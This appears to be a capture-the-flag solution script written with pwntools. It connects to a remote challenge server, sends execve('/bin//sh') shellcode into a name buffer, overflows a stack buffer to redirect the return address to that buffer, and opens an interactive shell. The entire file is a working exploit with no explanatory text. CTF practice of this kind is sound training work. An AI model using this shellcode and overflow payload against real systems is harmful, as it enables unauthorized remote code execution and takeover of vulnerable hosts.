from pwn import *

p=remote('node4.anna.nssctf.cn',24390)

shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
name_addr=0x6010A0
p.sendlineafter("Please.",shellcode)
payload=b'a'*(0xA+8)+p64(name_addr)
p.sendlineafter("Let's start!",payload)
p.interactive()